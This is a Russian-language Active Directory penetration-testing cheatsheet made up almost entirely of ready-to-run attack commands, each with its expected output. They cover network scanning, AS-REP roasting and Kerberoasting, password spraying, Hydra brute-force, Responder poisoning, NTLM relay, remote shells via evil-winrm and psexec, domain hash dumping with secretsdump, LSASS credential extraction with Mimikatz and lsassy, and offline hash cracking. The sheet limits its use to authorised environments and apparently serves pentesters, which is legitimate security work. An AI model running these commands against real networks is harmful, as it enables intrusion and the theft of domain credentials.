# Active Directory PenTest — Cheatsheet (Commands Only)

Все команды — только короткие примеры запусков, минимальное описание и ожидаемый ответ. Используй только в авторизованной среде.

---

## Установка (Kali) — быстрый набор

```bash
sudo apt update && sudo apt install -y \
  nmap smbclient smbmap hashcat john crackmapexec evil-winrm responder \
  python3-impacket python3-pip pipx golang git
python3 -m pip install --user pipx || true
python3 -m pipx ensurepath || true
export PATH="$HOME/.local/bin:$PATH"
pipx install enum4linux-ng || true
pipx install lsassy || true
go install github.com/ropnop/kerbrute@latest
```

*Описание:* устанавливает основные инструменты.
*Ожидается:* бинарники доступны в PATH.

---

## Фаза 1 — Разведка (Discovery)

### Полный TCP-скан подсети (nmap)

```bash
nmap -sS -p- --min-rate 1000 -T4 -oA nmap/all_tcp 10.0.0.0/24
```

*Действие:* скан всех TCP-портов по подсети.
*Ожидается:* файлы nmap/all\_tcp.\* с перечнем хостов и открытых портов.

### Быстрый сервис-скан (SMB, OS)

```bash
nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-protocols <IP>
```

*Действие:* сбор SMB-информации и списка шар.
*Ожидается:* вывод с версией SMB, списком шар и метаданными.

### Массовый быстрый скан (masscan -> nmap)

```bash
masscan 10.0.0.0/24 -p0-65535 --rate 10000 -oG masscan.gnmap
# затем фильтрация live hosts и nmap на найденные порты
```

*Действие:* очень быстрый порт-скан; результат — список хостов.
*Ожидается:* GNMAP с открытыми портами для дальнейшего nmap.

### SMB: список шар (smbclient)

```bash
smbclient -L //<IP> -U 'DOMAIN\\user'
```

*Действие:* получить список шар и доступность анонимного доступа.
*Ожидается:* таблица шар с правами и комментарием.

### SMB массовая enumeration (smbmap)

```bash
smbmap -H <IP> -u 'user' -p 'pass' -R
```

*Действие:* рекурсивный просмотр содержимого шар.
*Ожидается:* список файлов/директорий и разрешений.

### AD обзор (CrackMapExec)

```bash
crackmapexec smb 10.0.0.0/24 --shares --users --groups --sessions
```

*Действие:* агрегирует SMB/AD информацию по подсети.
*Ожидается:* табличный вывод с найденными учетками/шарами/сессиями.

### LDAP запрос (ldapsearch)

```bash
ldapsearch -x -H ldap://<DC_IP> -b "dc=domain,dc=local" "(objectClass=user)" cn sAMAccountName
```

*Действие:* извлекает объекты пользователей через LDAP.
*Ожидается:* список атрибутов найденных объектов.

### enum4linux-ng (автоматический сбор)

```bash
enum4linux-ng -a <IP>
```

*Действие:* полный набор enum-скриптов для SMB/AD.
*Ожидается:* сводный репорт с пользователями, групами, шарами.

---

## Фаза 2 — Enumeration (глубже)

### AS-REP roasting (GetNPUsers.py)

```bash
GetNPUsers.py domain/ -dc-ip <DC_IP> -format john -outputfile asrep.hash
```

*Действие:* собирает AS-REP хэши для аккаунтов без preauth.
*Ожидается:* файл asrep.hash (формат для john/hashcat).

### Kerberoast (GetUserSPNs.py)

```bash
GetUserSPNs.py domain/ -dc-ip <DC_IP> -request -outputfile krb5tgs.hash
```

*Действие:* запрашивает TGS для аккаунтов с SPN.
*Ожидается:* krb5tgs.hash (формат для офлайн подбора).

### Поиск GPP паролей в SYSVOL

```bash
smbclient //<DC_IP>/SYSVOL -U 'DOMAIN\\user' -c 'recurse; ls' | grep -i -E 'Groups.xml|Services.xml|cpassword'
```

*Действие:* ищет GPP XML с cpassword.
*Ожидается:* линии с cpassword или найденные XML-файлы.

### Сбор SharpHound (PowerShell)

```powershell
Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.LOCAL -ZipFileName bloodhound_all.zip
```

*Действие:* collect-all для BloodHound.
*Ожидается:* zip с JSON-экспортом для загрузки в BloodHound.

---

## Фаза 3 — Credential attacks

### Kerbrute — enum пользователей

```bash
kerbrute userenum --dc <DC_IP> -d domain.local users.txt --threads 50 -o kerbrute_found.txt
```

*Действие:* проверяет существование пользователей через Kerberos.
*Ожидается:* kerbrute\_found.txt с валидными логинами.

### Kerbrute — password spraying

```bash
kerbrute passwordspray --dc <DC_IP> -d domain.local users.txt 'Password1!' --threads 20 --safe
```

*Действие:* один пароль против списка пользователей с защитой от блокировок.
*Ожидается:* отчет об успешных попытках или предупреждение о lockout.

### Responder — LLMNR/NBT-NS poison

```bash
sudo responder -I eth0 -r -d -w
```

*Действие:* отвечает на LLMNR/NetBIOS запросы и ловит NTLM-хэши.
*Ожидается:* лог-файлы в каталоге Responder с захваченными хэшами.

### smbrelay / ntlmrelayx (impacket)

```bash
python3 ntlmrelayx.py -smb2support -t smb://<target_ip> -whitelist <allowed_ip> -of /tmp/relay_output.txt
```

*Действие:* релей захваченных NTLM-аутентификаций к цели.
*Ожидается:* успешный доступ/лог попыток релея.

### CrackMapExec — проверка creds массово

```bash
crackmapexec smb 10.0.0.0/24 -u users.txt -p passwords.txt --continue-on-success
```

*Действие:* массовая проверка логин:пароль по сети.
*Ожидается:* вывод успешных сочетаний и целевых хостов.

### Hydra — SMB brute-force

```bash
hydra -L users.txt -P passwords.txt smb://<IP> -t 8 -w 5
```

*Действие:* многопоточный подбор пар для SMB.
*Ожидается:* найденные пары и статистика.

---

## Фаза 4 — Эксплуатация / Lateral movement

### Evil-WinRM — WinRM shell

```bash
evil-winrm -i <IP> -u 'DOMAIN\\user' -p 'Passw0rd'
```

*Действие:* интерактивный remote shell через WinRM.
*Ожидается:* shell; возможность чтения/записи файлов и выполнения команд.

### Impacket psexec — запуск команды

```bash
python3 psexec.py 'DOMAIN/user:Pass@<IP>' cmd.exe /c whoami
```

*Действие:* выполнение команды через SMB сервис.
*Ожидается:* вывод whoami (пользователь, под кем выполнено).

### Impacket wmiexec — выполнение через WMI

```bash
python3 wmiexec.py 'DOMAIN/user:Pass@<IP>' 'ipconfig /all'
```

*Действие:* удалённый запуск команд через WMI.
*Ожидается:* вывод команды (ipconfig и т.д.).

### smbclient: скачивание файлов

```bash
smbclient //'\\<IP>\C$' -U 'DOMAIN\\user' -c 'lcd /tmp; mget *.evt'
```

*Действие:* скачать файлы с административной шары.
*Ожидается:* файлы в /tmp.

---

## Фаза 5 — Пост-эксплуатация

### secretsdump (impacket) — дамп хэшей

```bash
python3 secretsdump.py DOMAIN/admin:Pass@<DC_IP> -outputfile /tmp/secretsdump
```

*Действие:* извлекает NT/LM хэши и другие секреты (при правах).
*Ожидается:* файлы с хэшами (.sam, .ntds, .hashes).

### lsassy — извлечение creds из LSASS (удалённо)

```bash
lsassy -u 'Administrator' -p 'Passw0rd' -t <target_ip> -o lsassy_output.json
```

*Действие:* получить credentials через агенты/SMB/WMI.
*Ожидается:* JSON с найденными учетками/хэшами.

### Mimikatz — локально на Windows

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit
```

*Действие:* извлечение паролей/хэшей из LSASS.
*Ожидается:* список логонов с паролями/хэшами (если возможно).

### Rubeus — AS-REP / Kerberos ops (Windows)

```powershell
Rubeus.exe asreproast /domain:domain.local /outfile:asrep.txt
```

*Действие:* собирает AS-REP хэши для оффлайн подбора.
*Ожидается:* файл asrep.txt с хэшами.

---

## Оффлайн подбор хэшей

### Hashcat — Kerberoast TGS (mode 13100)

```bash
hashcat -m 13100 -a 0 krb5tgs.hash /usr/share/wordlists/rockyou.txt --status --status-timer=10
```

*Действие:* подбор паролей для TGS-хэшей.
*Ожидается:* найденные пароли в hashcat.potfile.

### Hashcat — AS-REP (mode 18200)

```bash
hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt --status
```

*Действие:* подбор паролей AS-REP.
*Ожидается:* найденные пароли в potfile.

### John — Kerberos пример

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs krb5tgs.hash
```

*Действие:* john подбирает для krb5tgs формата.
*Ожидается:* найденные пароли и лог прогресса.

---

## BloodHound / Neo4j

```bash
sudo systemctl start neo4j
# загрузить bloodhound_all.zip в BloodHound GUI
```

*Действие:* поднять БД и импорт JSON для анализа графа.
*Ожидается:* веб-интерфейс neo4j на :7474 и визуализация в BloodHound.

---

## Быстрые проверки и алиасы

```bash
which crackmapexec || echo "cme not found"
which GetNPUsers.py || echo "impacket scripts not in PATH"
which kerbrute || echo "kerbrute not found"
GetNPUsers.py --help
GetUserSPNs.py --help
secretsdump.py --help
```

*Действие:* проверить доступность инструментов и их help.
*Ожидается:* путь к бинарям или справочный вывод.

---

## Предупреждения (коротко)

```bash
# Responder: тестовая сеть только
sudo responder -I eth0 -r -d -w
# Сохраняй логи: cp -r /path/to/outputs /path/to/archive
```

*Действие:* напоминания по безопасности и сохранению артефактов.
*Ожидается:* лог-файлы и захваченные артефакты.

---

Конец. Только команды, краткие описания и ожидаемые ответы.
